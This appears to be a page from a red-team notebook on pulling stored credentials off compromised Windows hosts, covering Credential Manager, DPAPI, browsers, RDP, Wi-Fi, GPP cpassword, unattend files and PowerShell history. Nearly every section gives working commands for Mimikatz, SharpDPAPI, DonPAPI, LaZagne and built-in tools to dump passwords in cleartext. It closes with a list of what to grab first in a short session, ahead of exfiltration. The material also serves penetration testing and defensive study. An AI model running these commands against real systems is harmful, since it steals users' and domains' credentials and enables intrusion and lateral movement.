---
title: Credentials from Windows
---

Windows stores credentials in half a dozen places designed to be read only by the owning user or SYSTEM. On a live session, most of these are decryptable by the victim's own process — which is exactly what you have once you're running code as them.

LSASS, SAM, and NTDS.dit get their own sections ([[05. LSASS Dumping|05]], [[06. SAM, SYSTEM & SECURITY|06]], [[07. NTDS.dit & Domain Credentials|07]]). This file covers everything else: Credential Manager, DPAPI, browsers, RDP, Outlook, PowerShell history.

## Credential Manager

Vault UI that stores domain credentials (saved via `cmdkey`, `runas /savecred`), web credentials (IE/Edge), and generic creds (Outlook, Teams).

```cmd
rem List all stored credentials (no elevation needed)
cmdkey /list

rem Launch GUI vault
rundll32 keymgr.dll,KRShowKeyMgr

rem Use saved creds without knowing the password (interactive)
runas /savecred /user:DOMAIN\admin cmd.exe
```

```
# Mimikatz — pull them cleartext
privilege::debug
sekurlsa::credman
```

Vault file locations:
- `%LOCALAPPDATA%\Microsoft\Credentials\`
- `%APPDATA%\Microsoft\Credentials\`
- `%APPDATA%\Microsoft\Vault\`

Look for randomly-named GUID files alongside `Policy.vpol`.

## DPAPI — The Big Umbrella

Windows Data Protection API encrypts almost every per-user secret: browser passwords, saved RDP creds, Outlook, Credential Manager vault entries, Chrome cookies, WiFi profiles, VPN keys. Decryption uses the user's **masterkey**, which in turn is derived from the user's password (or decryptable with the DPAPI backup key held by every DC).

Masterkeys live at:
```
%APPDATA%\Microsoft\Protect\<SID>\
```

### Chrome / Edge Saved Passwords

```
# From an active user session (easiest)
privilege::debug
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

If you have the user's password, you can decrypt their masterkey offline:
```
dpapi::masterkey /in:"<masterkey-file>" /password:<user-pw>
dpapi::chrome    /in:"<Login Data>"      /masterkey:<decrypted-mk>
```

### Automated (SharpDPAPI / DonPAPI)

```
# From the box
SharpDPAPI.exe triage
SharpDPAPI.exe credentials
SharpDPAPI.exe rdg
SharpDPAPI.exe vaults
SharpDPAPI.exe chrome

# Remote — great for red teams
DonPAPI <domain>/<user>:<pw>@<target>
DonPAPI <domain>/<user>:<pw>@10.10.10.0/24
```

### LaZagne (Windows)

```
laZagne.exe all
laZagne.exe browsers
laZagne.exe mails
```

## RDP Saved Credentials

```cmd
rem File-based cached credentials
dir /s /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\
```
```
# Mimikatz
dpapi::rdg /in:"C:\path\to\<file>.rdg" /unprotect
```

## Browsers (beyond Chrome)

| Browser | File | Key |
|---|---|---|
| Chrome / Edge | `Login Data` (SQLite) | DPAPI masterkey + `Local State` |
| Firefox | `logins.json` + `key4.db` | NSS |
| Internet Explorer | DPAPI vault | DPAPI masterkey |

```bash
# Firefox offline
git clone https://github.com/unode/firefox_decrypt && cd firefox_decrypt
python3 firefox_decrypt.py <profile-dir>

# Chrome offline (post-DPAPI decrypt)
python3 chromepass.py "Login Data" <decrypted-masterkey>
```

## Outlook & Email

```
# Mimikatz
dpapi::ngc              # Next Gen Credentials (Hello / passport)

# Files — PST / OST sometimes hold creds in attachments
dir /s %USERPROFILE%\*.pst %USERPROFILE%\*.ost
```

Outlook stores server creds encrypted with DPAPI — SharpDPAPI's `triage` catches them.

## PowerShell & CMD History

```powershell
# Per-user PSReadLine history (goldmine)
Get-Content (Get-PSReadlineOption).HistorySavePath
# Default: %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Enumerate everyone's
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | %{ Get-Content $_.FullName }

# Doskey history buffer (current session only)
doskey /history
```

## WiFi Profiles

```powershell
# List
netsh wlan show profiles

# Dump password for one
netsh wlan show profile name="SSID" key=clear
```

## Group Policy Preferences (`cpassword`)

Mentioned in [[02. Credentials in the Network|Credentials in the Network]], repeated here because the file read often happens on a Windows host:

```powershell
# SYSVOL is readable by any authenticated user
dir /s \\<domain>\SYSVOL\*.xml
```
Decrypt with `gpp-decrypt <cpassword>` or Mimikatz `misc::gpprefdecrypt`.

## Unattended Install Files (Deployment Residue)

```cmd
dir /b /s C:\Windows\Panther\Unattend.xml 2>nul
dir /b /s C:\Windows\Panther\Unattended.xml 2>nul
dir /b /s C:\Windows\System32\Sysprep\unattend.xml 2>nul
dir /b /s C:\sysprep.inf 2>nul
```

```xml
<!-- base64-encoded local Administrator password, often still valid -->
<AdministratorPassword>
  <Value>UGFzc3dvcmQxMjMh</Value>
  <PlainText>false</PlainText>
</AdministratorPassword>
```

## PowerShell Secret Management / Stored Creds

```powershell
# Export-Clixml creds — only decryptable by the user who saved them
Get-ChildItem C:\Users\*\*.xml -ErrorAction SilentlyContinue |
  Select-String 'System.Management.Automation.PSCredential'
```

## Running Processes with Creds on Command Line

```powershell
Get-CimInstance Win32_Process | Select Name, CommandLine | Format-List
# or
wmic process list full /format:list | findstr CommandLine
```

Scheduled task / service startup is a common place to find `-user admin -password SuperSecret`.

## Shortcut Priority

If you only have a few minutes in a session, pull these first:

1. `cmdkey /list` + Mimikatz `sekurlsa::credman`
2. SharpDPAPI `triage` (covers RDP, browsers, vaults in one shot)
3. PSReadLine `ConsoleHost_history.txt`
4. `netsh wlan show profile name=* key=clear`
5. `wmic process list full | findstr password`
6. Drop LSASS dump for offline parsing

Everything else can wait for an async exfil.
